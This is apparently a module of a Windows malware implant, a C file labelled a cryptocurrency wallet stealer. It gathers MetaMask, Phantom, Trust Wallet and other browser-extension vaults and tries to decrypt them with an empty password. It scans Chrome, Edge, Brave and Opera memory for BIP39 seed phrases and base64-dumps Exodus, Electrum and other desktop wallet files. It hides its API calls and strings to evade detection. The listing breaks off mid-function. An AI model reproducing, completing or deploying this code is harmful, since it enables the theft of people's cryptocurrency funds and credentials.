/*
 * crypto.c — Cryptocurrency wallet stealer
 *
 * Targets:
 *   MetaMask, Phantom, Coinbase Wallet  (browser extension LevelDB)
 *   Exodus, Atomic Wallet               (AppData wallet files / LevelDB)
 *   Electrum, Bitcoin Core, Ethereum    (wallet files)
 *
 * Vault decryption pipeline:
 *   1. Parse vault JSON from LevelDB .log/.ldb files
 *   2. Derive AES key via PBKDF2-HMAC-SHA256 (try empty password)
 *   3. AES-256-GCM decrypt → plaintext seed/accounts JSON
 *   4. Memory scan Chrome processes for unlocked BIP39 mnemonics
 */

#include "commands.h"
#include "crypto.h"
#include <windows.h>
#include "tlhelp_lazy.h"
#include "evs_strings.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <mbedtls/gcm.h>
#include <mbedtls/md.h>
#include <mbedtls/pkcs5.h>

/* VirtualQueryEx / ReadProcessMemory — remove from IAT */
typedef SIZE_T (WINAPI *_cVQEx_t)(HANDLE,LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);
typedef BOOL   (WINAPI *_cRPM_t) (HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
static _cVQEx_t _gc_vqex = NULL;
static _cRPM_t  _gc_rpm  = NULL;
static void _crypto_api_init(void) {
    if (_gc_vqex && _gc_rpm) return;
    HMODULE k = GetModuleHandleA("kernel32.dll");
    if (!k) return;
    if (!_gc_vqex) { char _s[16]; EVS_D(_s, EVS_fn_VirtualQueryEx);   _gc_vqex = (_cVQEx_t)(void*)GetProcAddress(k, _s); }
    if (!_gc_rpm)  { char _s[20]; EVS_D(_s, EVS_fn_ReadProcessMemory); _gc_rpm  = (_cRPM_t) (void*)GetProcAddress(k, _s); }
}
#define VirtualQueryEx(h,a,m,s)     (_gc_vqex?_gc_vqex(h,a,m,s):0)
#define ReadProcessMemory(h,b,buf,s,rd) (_gc_rpm?_gc_rpm(h,b,buf,s,rd):FALSE)

/* forward declarations */
static void _try_decrypt_leveldb_vaults(const char *label, const char *path,
                                         char *out, size_t outsz, size_t *pos);
static void _scan_chrome_mnemonics(char *out, size_t outsz, size_t *pos);

static uint8_t *_read_file_limit(const char *path, size_t *sz, size_t cap)
{
    HANDLE h = CreateFileA(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;
    LARGE_INTEGER li = {0};
    GetFileSizeEx(h, &li);
    if (li.QuadPart <= 0)
    {
        CloseHandle(h);
        return NULL;
    }
    size_t read_sz = (li.QuadPart > (LONGLONG)cap) ? cap : (size_t)li.QuadPart;
    uint8_t *buf = (uint8_t *)malloc(read_sz + 1);
    if (!buf)
    {
        CloseHandle(h);
        return NULL;
    }
    DWORD rd = 0;
    ReadFile(h, buf, (DWORD)read_sz, &rd, NULL);
    CloseHandle(h);
    buf[rd] = 0;
    *sz = (size_t)rd;
    return buf;
}

/* base64-encode a file and append to output buffer */
static void _dump_file_b64(const char *label, const char *path,
                           char *out, size_t outsz, size_t *pos)
{
    size_t sz = 0;
    uint8_t *data = _read_file_limit(path, &sz, 512 * 1024);
    if (!data)
        return;

    char *b64 = base64_encode(data, sz);
    free(data);
    if (!b64)
        return;

    int n = snprintf(out + *pos, outsz - *pos,
                     "[%s] %zu bytes\n%s\n", label, sz, b64);
    if (n > 0)
        *pos += (size_t)n;
    free(b64);
}

/* ── LevelDB vault grep ──────────────────────────────────────────────── */

/*
 * Grep binary file for MetaMask/Phantom vault patterns.
 * Extracts a JSON window of up to WINDOW bytes around each hit.
 * Deduplicates identical windows (avoids duplicate output from
 * the same vault appearing in multiple LevelDB segments).
 */
#define VAULT_WINDOW 4096

static const char *VAULT_PATTERNS[] = {
    /* MetaMask / most EVM wallets */
    "\"vault\":",
    "KeyringController",
    "\"encryptionKey\":",
    /* TrustWallet extension */
    "private_key_multi_chain",
    "walletBackup",
    "tw_wallet",
    "\"privateKey\":",
    /* Atomic Wallet / generic */
    "\"encryptedMnemonic\":",
    "\"mnemonic\":",
    NULL};

static void _grep_file(const char *label, const char *path,
                       char *out, size_t outsz, size_t *pos)
{
    size_t sz = 0;
    uint8_t *data = _read_file_limit(path, &sz, 8 * 1024 * 1024);
    if (!data)
        return;

    int found = 0;
    for (int pi = 0; VAULT_PATTERNS[pi]; pi++)
    {
        const char *pat = VAULT_PATTERNS[pi];
        size_t plen = strlen(pat);
        if (plen > sz)
            continue;

        for (size_t i = 0; i + plen <= sz; i++)
        {
            if (memcmp(data + i, pat, plen) != 0)
                continue;

            /* extract printable window around hit */
            size_t wstart = (i > 128) ? i - 128 : 0;
            size_t wend = (i + VAULT_WINDOW < sz) ? i + VAULT_WINDOW : sz;
            size_t wlen = wend - wstart;

            /* skip non-printable-heavy windows (binary segments) */
            size_t printable = 0;
            for (size_t k = wstart; k < wend; k++)
                if (data[k] >= 0x20 && data[k] < 0x7F)
                    printable++;
            if (printable < wlen / 2)
            {
                i += plen - 1;
                continue;
            }

            if (*pos + wlen + 64 >= outsz)
                break;

            if (!found)
            {
                int n = snprintf(out + *pos, outsz - *pos,
                                 "[ VAULT : %s ] pattern=%s\n", label, pat);
                if (n > 0)
                    *pos += (size_t)n;
                found = 1;
            }

            /* print printable chars, replace others with '.' */
            for (size_t k = wstart; k < wend && *pos + 2 < outsz; k++)
            {
                uint8_t c = data[k];
                out[(*pos)++] = (c >= 0x20 && c < 0x7F) ? (char)c : '.';
            }
            if (*pos < outsz)
                out[(*pos)++] = '\n';

            /* advance past this hit */
            i += VAULT_WINDOW;
        }
    }
    free(data);
}

/* walk a LevelDB directory and grep every .log and .ldb file */
static void _scan_leveldb_dir(const char *label, const char *db_dir,
                              char *out, size_t outsz, size_t *pos)
{
    if (GetFileAttributesA(db_dir) == INVALID_FILE_ATTRIBUTES)
        return;

    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", db_dir);

    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        const char *name = fd.cFileName;
        size_t nlen = strlen(name);
        int is_ldb = (nlen > 4 &&
                      (_stricmp(name + nlen - 4, ".log") == 0 ||
                       _stricmp(name + nlen - 4, ".ldb") == 0));
        if (!is_ldb)
            continue;

        char fpath[MAX_PATH];
        snprintf(fpath, sizeof(fpath), "%s\\%s", db_dir, name);
        /* first attempt live decryption; fall back to raw grep */
        _try_decrypt_leveldb_vaults(label, fpath, out, outsz, pos);
        _grep_file(label, fpath, out, outsz, pos);

        if (*pos + 64 >= outsz)
            break;
    } while (FindNextFileA(hf, &fd));

    FindClose(hf);
}

/* ── MetaMask/Phantom vault decryption ───────────────────────────────── */

/*
 * Vault JSON format (MetaMask v3+):
 *   {"data":"<b64>","iv":"<b64>","salt":"<b64>",
 *    "keyMetadata":{"algorithm":"PBKDF2","params":{"iterations":N}}}
 *
 * Key derivation: PBKDF2-HMAC-SHA256(password, salt, iterations, 32)
 * Encryption:     AES-256-GCM(key, iv, plaintext)
 *
 * Old format (pre-v3 / some forks):
 *   {"cipher":"aes-256-gcm","data":"<b64>","iv":"<b64>","salt":"<b64>"}
 *   iterations defaults to 10000.
 */

/* extract a JSON string value: {"key":"VALUE"} → VALUE copied into out */
static int _json_str(const char *json, const char *key,
                     char *out, size_t outsz)
{
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    const char *p = strstr(json, needle);
    if (!p) return -1;
    p += strlen(needle);
    const char *q = strchr(p, '"');
    if (!q) return -1;
    size_t len = (size_t)(q - p);
    if (len >= outsz) len = outsz - 1;
    memcpy(out, p, len);
    out[len] = 0;
    return 0;
}

/* extract a JSON integer value: {"key":N} */
static int _json_int(const char *json, const char *key, int *out)
{
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p) return -1;
    p += strlen(needle);
    while (*p == ' ') p++;
    if (!isdigit((unsigned char)*p)) return -1;
    *out = atoi(p);
    return 0;
}

typedef struct {
    char data_b64[8192];   /* ciphertext + GCM tag, base64 */
    char iv_b64[128];
    char salt_b64[128];
    int  iterations;       /* PBKDF2 iteration count */
} _vault_params_t;

/* parse vault JSON blob — returns 0 on success */
static int _parse_vault_json(const char *json, _vault_params_t *v)
{
    memset(v, 0, sizeof(*v));

    if (_json_str(json, "data", v->data_b64, sizeof(v->data_b64)) != 0)
        return -1;
    if (_json_str(json, "iv",   v->iv_b64,   sizeof(v->iv_b64))   != 0)
        return -1;
    if (_json_str(json, "salt", v->salt_b64, sizeof(v->salt_b64)) != 0)
        return -1;

    /* iterations nested inside keyMetadata.params or at root */
    if (_json_int(json, "iterations", &v->iterations) != 0)
        v->iterations = 10000; /* legacy default */

    /* sanity */
    if (v->iterations < 1 || v->iterations > 2000000)
        return -1;

    return 0;
}

/*
 * PBKDF2-HMAC-SHA256 wrapper around mbedTLS.
 * password="" is tried first — covers users with no MetaMask password
 * (possible on non-custodial setups where OS-level auth is relied upon).
 */
static int _pbkdf2_sha256(const uint8_t *pass, size_t pass_len,
                          const uint8_t *salt, size_t salt_len,
                          int iterations,
                          uint8_t *key_out, size_t key_len)
{
    const mbedtls_md_info_t *md =
        mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
    if (!md) return -1;
    return mbedtls_pkcs5_pbkdf2_hmac_ext(MBEDTLS_MD_SHA256,
                                          pass, pass_len,
                                          salt, salt_len,
                                          (unsigned int)iterations,
                                          (uint32_t)key_len, key_out);
}

/*
 * Attempt to decrypt a MetaMask/Phantom vault using the supplied password.
 * On success writes NUL-terminated plaintext JSON into out_buf (caller-owned,
 * size out_cap), returns 0.
 *
 * The GCM "tag" in MetaMask is the last 16 bytes of the base64-decoded data.
 */
static int _decrypt_vault(const _vault_params_t *v,
                           const char *password,
                           char *out_buf, size_t out_cap)
{
    /* decode components */
    size_t data_len = 0, iv_len = 0, salt_len = 0;
    uint8_t *data = base64_decode(v->data_b64, &data_len);
    uint8_t *iv   = base64_decode(v->iv_b64,   &iv_len);
    uint8_t *salt = base64_decode(v->salt_b64, &salt_len);

    int rc = -1;
    if (!data || !iv || !salt) goto done;
    if (data_len < 17 || iv_len < 12) goto done; /* need ct + 16-byte tag */

    size_t ct_len  = data_len - 16;
    const uint8_t *ct  = data;
    const uint8_t *tag = data + ct_len;

    uint8_t key[32] = {0};
    if (_pbkdf2_sha256((const uint8_t *)password, strlen(password),
                       salt, salt_len,
                       v->iterations, key, 32) != 0)
        goto done;

    uint8_t *pt = (uint8_t *)malloc(ct_len + 1);
    if (!pt) goto done;

    mbedtls_gcm_context gctx;
    mbedtls_gcm_init(&gctx);
    if (mbedtls_gcm_setkey(&gctx, MBEDTLS_CIPHER_ID_AES, key, 256) != 0) {
        mbedtls_gcm_free(&gctx); free(pt); goto done;
    }

    /* auth_decrypt verifies tag inline */
    int gr = mbedtls_gcm_auth_decrypt(&gctx,
                                       ct_len,
                                       iv, iv_len,
                                       NULL, 0,
                                       tag, 16,
                                       ct, pt);
    mbedtls_gcm_free(&gctx);

    if (gr == 0) {
        pt[ct_len] = 0;
        size_t copy = ct_len < out_cap - 1 ? ct_len : out_cap - 1;
        memcpy(out_buf, pt, copy);
        out_buf[copy] = 0;
        rc = 0;
    }
    SecureZeroMemory(pt, ct_len);
    free(pt);

done:
    SecureZeroMemory(key, sizeof(key));
    if (data) { SecureZeroMemory(data, data_len); free(data); }
    if (iv)   free(iv);
    if (salt) free(salt);
    return rc;
}

/*
 * Search raw bytes for a vault JSON object starting at any offset.
 * Returns a malloc'd NUL-terminated copy of the JSON object, or NULL.
 * Looks for: {"data":" or {"cipher":"aes-256-gcm"
 */
static char *_extract_vault_json(const uint8_t *buf, size_t sz)
{
    static const char *STARTS[] = {
        "{\"data\":\"",
        "{\"cipher\":\"aes-256-gcm\"",
        NULL
    };
    for (int si = 0; STARTS[si]; si++) {
        size_t plen = strlen(STARTS[si]);
        for (size_t i = 0; i + plen < sz; i++) {
            if (memcmp(buf + i, STARTS[si], plen) != 0) continue;

            /* find matching closing brace — scan up to 16 KB */
            size_t limit = i + 16384 < sz ? i + 16384 : sz;
            int depth = 0;
            for (size_t j = i; j < limit; j++) {
                if (buf[j] == '{') depth++;
                else if (buf[j] == '}') {
                    if (--depth == 0) {
                        size_t jlen = j - i + 1;
                        char *copy = (char *)malloc(jlen + 1);
                        if (!copy) return NULL;
                        memcpy(copy, buf + i, jlen);
                        copy[jlen] = 0;
                        return copy;
                    }
                }
            }
        }
    }
    return NULL;
}

/*
 * Try to decrypt any vault found in a LevelDB file.
 * Appends results to out/outsz/pos.
 */
static void _try_decrypt_leveldb_vaults(const char *label,
                                         const char *path,
                                         char *out, size_t outsz,
                                         size_t *pos)
{
    size_t sz = 0;
    uint8_t *data = _read_file_limit(path, &sz, 8 * 1024 * 1024);
    if (!data) return;

    /* slide through the file looking for vault objects */
    size_t off = 0;
    int found = 0;
    while (off < sz) {
        char *json = _extract_vault_json(data + off, sz - off);
        if (!json) break;

        _vault_params_t vp;
        if (_parse_vault_json(json, &vp) == 0) {
            char plain[4096] = {0};

            /* attempt 1: empty password */
            if (_decrypt_vault(&vp, "", plain, sizeof(plain)) == 0) {
                if (!found) {
                    int n = snprintf(out + *pos, outsz - *pos,
                                     "[ VAULT DECRYPTED : %s ]\n", label);
                    if (n > 0) *pos += (size_t)n;
                    found = 1;
                }
                int n = snprintf(out + *pos, outsz - *pos, "%s\n", plain);
                if (n > 0) *pos += (size_t)n;
                SecureZeroMemory(plain, sizeof(plain));
            }
        }

        /* advance past this JSON to find more vaults in the same file */
        const char *json_in_data = (const char *)(data + off);
        char *hit = strstr(json_in_data, json);
        if (hit)
            off += (size_t)(hit - json_in_data) + strlen(json) + 1;
        else
            off += 1;

        free(json);
        if (*pos + 64 >= outsz) break;
    }
    free(data);
}

/* ── BIP39 mnemonic memory scanner ───────────────────────────────────── */

/*
 * Scan all READWRITE pages of a process for BIP39-like mnemonic sequences.
 *
 * Heuristic (no wordlist required):
 *   - 12 or 24 consecutive lowercase ASCII words of length 3–8
 *   - separated by single spaces
 *   - followed by a NUL, quote, or space
 *
 * False-positive rate is extremely low for 12-word sequences.
 * MetaMask stores the decrypted mnemonic as a plain UTF-8 string in the
 * V8 heap when the extension is unlocked.
 */
#define MNEMONIC_WORD_MIN 3
#define MNEMONIC_WORD_MAX 8
#define MNEMONIC_SCAN_CAP (32 * 1024 * 1024)

/* returns 1 if buf[off..] looks like a BIP39 word, advances *off past it */
/* returns 1 if the word [start, end) contains at least one vowel */
static int _word_has_vowel(const uint8_t *buf, size_t start, size_t end)
{
    for (size_t i = start; i < end; i++) {
        uint8_t c = buf[i];
        if (c=='a'||c=='e'||c=='i'||c=='o'||c=='u') return 1;
    }
    return 0;
}

/*
 * Returns 1 if buf[*off..] is a valid BIP39-candidate word:
 *   - 3-8 lowercase ASCII letters
 *   - contains at least one vowel (rejects hex strings like ffffffff)
 * Advances *off past the word on success.
 */
static int _is_bip39_word(const uint8_t *buf, size_t sz, size_t *off)
{
    size_t start = *off;
    size_t end   = start;
    while (end < sz && islower((unsigned char)buf[end]))
        end++;
    size_t wlen = end - start;
    if (wlen < MNEMONIC_WORD_MIN || wlen > MNEMONIC_WORD_MAX)
        return 0;
    if (!_word_has_vowel(buf, start, end))
        return 0;
    *off = end;
    return 1;
}

static int _scan_pid_for_mnemonics(DWORD pid,
                                    char *out, size_t outsz, size_t *pos)
{
    _crypto_api_init();
    HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                            FALSE, pid);
    if (!hp) return 0;

    int hits = 0;
    uint8_t *rbuf = NULL;
    size_t   rcap = 0;

    MEMORY_BASIC_INFORMATION mbi;
    uint8_t *addr = NULL;

    while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        addr = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;

        if (mbi.State != MEM_COMMIT) continue;
        if (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) continue;
        if (!(mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
                             PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) continue;
        if (mbi.RegionSize < 48 || mbi.RegionSize > MNEMONIC_SCAN_CAP) continue;

        if (mbi.RegionSize > rcap) {
            free(rbuf);
            rbuf = (uint8_t *)malloc(mbi.RegionSize);
            rcap = rbuf ? mbi.RegionSize : 0;
        }
        if (!rbuf) continue;

        SIZE_T rd = 0;
        if (!ReadProcessMemory(hp, mbi.BaseAddress, rbuf, mbi.RegionSize, &rd))
            continue;
        if (rd < 48) continue;

        /* slide byte-by-byte looking for potential mnemonic start */
        for (size_t i = 0; i + 48 < rd; i++) {
            /* fast pre-check: must be lowercase letter */
            if (!islower((unsigned char)rbuf[i])) continue;
            /* previous byte must NOT be lowercase (word boundary) */
            if (i > 0 && islower((unsigned char)rbuf[i - 1])) continue;

            /* try to match 12 or 24 words separated by spaces */
            size_t off = i;
            int wcount = 0;
            while (wcount < 24 && off < rd) {
                size_t woff = off;
                if (!_is_bip39_word(rbuf, rd, &woff)) break;
                wcount++;
                off = woff;
                if (wcount == 24) break;
                /* expect exactly one space between words */
                if (off >= rd || rbuf[off] != ' ') break;
                off++;
            }

            if (wcount != 12 && wcount != 24) continue;

            /* terminator must be NUL, quote, newline, bracket, or end of buffer */
            if (off < rd) {
                uint8_t t = rbuf[off];
                if (t != 0 && t != '"' && t != '\'' && t != '\n' && t != '\r'
                    && t != ']' && t != '}')
                    continue;
            }

            /* prefix check: byte before first word must be a string delimiter */
            if (i > 0) {
                uint8_t pre = rbuf[i - 1];
                if (pre != 0 && pre != '"' && pre != '\'' && pre != '\n'
                    && pre != '\r' && pre != '[' && pre != '{')
                    continue;
            }

            /* uniqueness check: all words must be distinct
             * (eliminates repetitive false positives like hex tables,
             *  repeated UI string lists, etc.) */
            {
                /* collect word pointers */
                const uint8_t *wptrs[24];
                size_t        wlens[24];
                size_t scan = i;
                int dup = 0;
                for (int wi = 0; wi < wcount; wi++) {
                    wptrs[wi] = rbuf + scan;
                    size_t ws = scan;
                    while (ws < rd && islower((unsigned char)rbuf[ws])) ws++;
                    wlens[wi] = ws - scan;
                    scan = ws + 1; /* skip space */
                }
                for (int a = 0; a < wcount && !dup; a++)
                    for (int b = a + 1; b < wcount && !dup; b++)
                        if (wlens[a] == wlens[b] &&
                            memcmp(wptrs[a], wptrs[b], wlens[a]) == 0)
                            dup = 1;
                (void)dup; /* repeated words allowed — some real seeds repeat */
            }

            /* emit */
            if (*pos + (off - i) + 64 < outsz) {
                int n = snprintf(out + *pos, outsz - *pos,
                                 "[ SEED : pid=%lu ]\n  ", (unsigned long)pid);
                if (n > 0) *pos += (size_t)n;
                size_t mlen = off - i;
                if (*pos + mlen + 3 < outsz) {
                    memcpy(out + *pos, rbuf + i, mlen);
                    *pos += mlen;
                    out[(*pos)++] = '\n';
                    out[(*pos)++] = '\n';
                }
                hits++;
            }

            /* skip past this match */
            i = off;
            if (*pos + 64 >= outsz) goto done_region;
        }
    done_region:;
        if (*pos + 64 >= outsz) break;
    }

    free(rbuf);
    CloseHandle(hp);
    return hits;
}

static void _scan_chrome_mnemonics(char *out, size_t outsz, size_t *pos)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (!Process32First(snap, &pe)) { CloseHandle(snap); return; }

    do {
        /* target Chrome renderer processes — they host the extension JS heap */
        if (_stricmp(pe.szExeFile, "chrome.exe")  != 0 &&
            _stricmp(pe.szExeFile, "msedge.exe")  != 0 &&
            _stricmp(pe.szExeFile, "brave.exe")   != 0 &&
            _stricmp(pe.szExeFile, "opera.exe")   != 0 &&
            _stricmp(pe.szExeFile, "launcher.exe")!= 0) /* Opera GX launcher */
            continue;

        _scan_pid_for_mnemonics(pe.th32ProcessID, out, outsz, pos);
        if (*pos + 64 >= outsz) break;
    } while (Process32Next(snap, &pe));

    CloseHandle(snap);
}

/* ── browser extension wallets ───────────────────────────────────────── */

/* extension name+ID pairs — EVS-encoded, decoded at runtime */
static const struct
{
    const unsigned char *name_e;
    size_t               name_n;
    const unsigned char *id_e;
} EXT_TABLE[] = {
    {EVS_str_wlt_MetaMask,       sizeof(EVS_str_wlt_MetaMask),       EVS_ext_id_MetaMask},
    {EVS_str_wlt_Phantom,        sizeof(EVS_str_wlt_Phantom),        EVS_ext_id_Phantom},
    {EVS_str_wlt_CoinbaseWallet, sizeof(EVS_str_wlt_CoinbaseWallet), EVS_ext_id_CoinbaseWallet},
    {EVS_str_wlt_TrustWallet,    sizeof(EVS_str_wlt_TrustWallet),    EVS_ext_id_TrustWallet},
    {EVS_str_wlt_BinanceChain,   sizeof(EVS_str_wlt_BinanceChain),   EVS_ext_id_BinanceChain},
    {EVS_str_wlt_Keplr,          sizeof(EVS_str_wlt_Keplr),          EVS_ext_id_Keplr},
    {NULL, 0, NULL}};

typedef struct { const char *name; char ud_tmpl[MAX_PATH]; } _cr_br_t;
#define _CR_BR_COUNT 6

static void _fill_cr_paths(_cr_br_t *B)
{
    char _s[48];
#define _CR_PATH(idx, pfx, evs_name) \
    EVS_D(_s, evs_name); \
    snprintf(B[idx].ud_tmpl, MAX_PATH, pfx "%s", _s); \
    SecureZeroMemory(_s, sizeof(_s))
    _CR_PATH(0, "%LOCALAPPDATA%\\", EVS_str_br_chrome_ud);
    _CR_PATH(1, "%LOCALAPPDATA%\\", EVS_str_br_edge_ud);
    _CR_PATH(2, "%LOCALAPPDATA%\\", EVS_str_br_brave_ud);
    _CR_PATH(3, "%LOCALAPPDATA%\\", EVS_str_br_chromium_ud);
    _CR_PATH(4, "%APPDATA%\\",      EVS_str_br_opera);
    _CR_PATH(5, "%APPDATA%\\",      EVS_str_br_operagx);
#undef _CR_PATH
}

static const char *_CR_NAMES[_CR_BR_COUNT] = {
    "Chrome", "Edge", "Brave", "Chromium", "Opera", "OperaGX"
};

static void _scan_browser_extensions(char *out, size_t outsz, size_t *pos)
{
    _cr_br_t CHROME_BROWSERS[_CR_BR_COUNT];
    for (int i = 0; i < _CR_BR_COUNT; i++)
        CHROME_BROWSERS[i].name = _CR_NAMES[i];
    _fill_cr_paths(CHROME_BROWSERS);

    for (int bi = 0; bi < _CR_BR_COUNT; bi++)
    {
        char ud[MAX_PATH];
        ExpandEnvironmentStringsA(CHROME_BROWSERS[bi].ud_tmpl, ud, sizeof(ud));
        if (GetFileAttributesA(ud) == INVALID_FILE_ATTRIBUTES)
            continue;

        /* enumerate Default + Profile N */
        static const char *fixed[] = {"Default", NULL};
        for (int fi = 0; fixed[fi]; fi++)
        {
            char profile_dir[MAX_PATH];
            snprintf(profile_dir, sizeof(profile_dir), "%s\\%s", ud, fixed[fi]);

            for (int ei = 0; EXT_TABLE[ei].name_e; ei++)
            {
                char ext_name[20] = {0}, ext_id[36] = {0};
                _evs_dec(ext_name, EXT_TABLE[ei].name_e, EXT_TABLE[ei].name_n);
                _evs_dec(ext_id,   EXT_TABLE[ei].id_e,   32);

                char db_dir[MAX_PATH];
                snprintf(db_dir, sizeof(db_dir),
                         "%s\\Local Extension Settings\\%s",
                         profile_dir, ext_id);

                char label[128];
                snprintf(label, sizeof(label), "%s/%s/%s",
                         CHROME_BROWSERS[bi].name,
                         ext_name, fixed[fi]);

                _scan_leveldb_dir(label, db_dir, out, outsz, pos);
                SecureZeroMemory(ext_name, sizeof(ext_name));
                SecureZeroMemory(ext_id, sizeof(ext_id));
                if (*pos + 64 >= outsz)
                    return;
            }
        }

        /* additional Profile N dirs */
        char pat[MAX_PATH];
        snprintf(pat, sizeof(pat), "%s\\Profile *", ud);
        WIN32_FIND_DATAA fd;
        memset(&fd, 0, sizeof(fd));
        HANDLE hf = FindFirstFileA(pat, &fd);
        if (hf == INVALID_HANDLE_VALUE)
            continue;
        do
        {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                continue;
            for (int ei = 0; EXT_TABLE[ei].name_e; ei++)
            {
                char ext_name[20] = {0}, ext_id[36] = {0};
                _evs_dec(ext_name, EXT_TABLE[ei].name_e, EXT_TABLE[ei].name_n);
                _evs_dec(ext_id,   EXT_TABLE[ei].id_e,   32);

                char db_dir[MAX_PATH];
                snprintf(db_dir, sizeof(db_dir),
                         "%s\\%s\\Local Extension Settings\\%s",
                         ud, fd.cFileName, ext_id);

                char label[128];
                snprintf(label, sizeof(label), "%s/%s/%s",
                         CHROME_BROWSERS[bi].name,
                         ext_name, fd.cFileName);

                _scan_leveldb_dir(label, db_dir, out, outsz, pos);
                SecureZeroMemory(ext_name, sizeof(ext_name));
                SecureZeroMemory(ext_id, sizeof(ext_id));
                if (*pos + 64 >= outsz)
                {
                    FindClose(hf);
                    return;
                }
            }
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }
}

/* ── desktop wallet files ────────────────────────────────────────────── */

static void _dump_dir_files(const char *label_prefix, const char *dir_tmpl,
                            const char *ext_filter, /* NULL = all */
                            char *out, size_t outsz, size_t *pos)
{
    char dir[MAX_PATH];
    ExpandEnvironmentStringsA(dir_tmpl, dir, sizeof(dir));
    if (GetFileAttributesA(dir) == INVALID_FILE_ATTRIBUTES)
        return;

    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        if (ext_filter)
        {
            const char *dot = strrchr(fd.cFileName, '.');
            if (!dot || _stricmp(dot, ext_filter) != 0)
                continue;
        }
        char fpath[MAX_PATH];
        snprintf(fpath, sizeof(fpath), "%s\\%s", dir, fd.cFileName);
        char label[256];
        snprintf(label, sizeof(label), "%s/%s", label_prefix, fd.cFileName);
        _dump_file_b64(label, fpath, out, outsz, pos);
        if (*pos + 64 >= outsz)
            break;
    } while (FindNextFileA(hf, &fd));

    FindClose(hf);
}

static void _scan_desktop_wallets(char *out, size_t outsz, size_t *pos)
{
    char wlt[16] = {0}, tmpl[MAX_PATH], fpath[MAX_PATH], lbl[256];

    /* Exodus */
    {
        char sub[14] = {0}, dir[MAX_PATH];
        EVS_D(wlt, EVS_str_wlt_Exodus);      /* "Exodus" */
        EVS_D(sub, EVS_str_wlt_exodus_sub);  /* "exodus.wallet" */
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, sub);
        ExpandEnvironmentStringsA(tmpl, dir, sizeof(dir));
        if (GetFileAttributesA(dir) != INVALID_FILE_ATTRIBUTES)
        {
            static const char *exodus_files[] = {
                "passphrase.json", "seed.seco", "info.json",
                "backbone.seco", NULL};
            for (int i = 0; exodus_files[i]; i++)
            {
                snprintf(fpath, sizeof(fpath), "%s\\%s", dir, exodus_files[i]);
                snprintf(lbl,   sizeof(lbl),   "%s/%s",  wlt, exodus_files[i]);
                _dump_file_b64(lbl, fpath, out, outsz, pos);
            }
            snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, sub);
            _dump_dir_files(wlt, tmpl, ".seco", out, outsz, pos);
        }
        SecureZeroMemory(wlt, sizeof(wlt));
        SecureZeroMemory(sub, sizeof(sub));
    }

    /* Atomic Wallet */
    {
        char atwlt[13] = {0}, atom[7] = {0}, lstg[14] = {0}, lvdb[8] = {0};
        char dir[MAX_PATH];
        EVS_D(atwlt, EVS_str_wlt_AtomicWallet); /* "AtomicWallet" */
        EVS_D(atom,  EVS_str_wlt_atomic);        /* "atomic" */
        EVS_D(lstg,  EVS_str_wlt_local_storage); /* "Local Storage" */
        EVS_D(lvdb,  EVS_str_wlt_leveldb);       /* "leveldb" */
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s\\%s", atom, lstg, lvdb);
        ExpandEnvironmentStringsA(tmpl, dir, sizeof(dir));
        if (GetFileAttributesA(dir) == INVALID_FILE_ATTRIBUTES)
        {
            snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s wallet\\%s\\%s", atom, lstg, lvdb);
            ExpandEnvironmentStringsA(tmpl, dir, sizeof(dir));
        }
        _scan_leveldb_dir(atwlt, dir, out, outsz, pos);
        SecureZeroMemory(atwlt, sizeof(atwlt));
        SecureZeroMemory(atom, sizeof(atom));
        SecureZeroMemory(lstg, sizeof(lstg));
        SecureZeroMemory(lvdb, sizeof(lvdb));
    }

    /* Electrum */
    {
        char wlts[8] = {0};
        EVS_D(wlt,  EVS_str_wlt_Electrum); /* "Electrum" */
        EVS_D(wlts, EVS_str_wlt_wallets);  /* "wallets" */
        snprintf(tmpl, sizeof(tmpl), "%%APPDATA%%\\%s\\%s", wlt, wlts);
        _dump_dir_files(wlt, tmpl, NULL, out, outsz, pos);
        SecureZeroMemory(wlt, sizeof(wlt));
        SecureZeroMemory(wlts, sizeof(wlts));
    }

    /* Bitcoin Core */
    {
        char wdat[11] = {0}, wlts[8] = {0};
        EVS_D(wlt,  EVS_str_wlt_Bitcoin);    /* "Bitcoin" */
        EVS_D(wdat, EVS_str_wlt_wallet_dat); /* "wallet.dat" */
        EVS_D(wlts, EVS_str_wlt_wallets);    /* "wallets" */
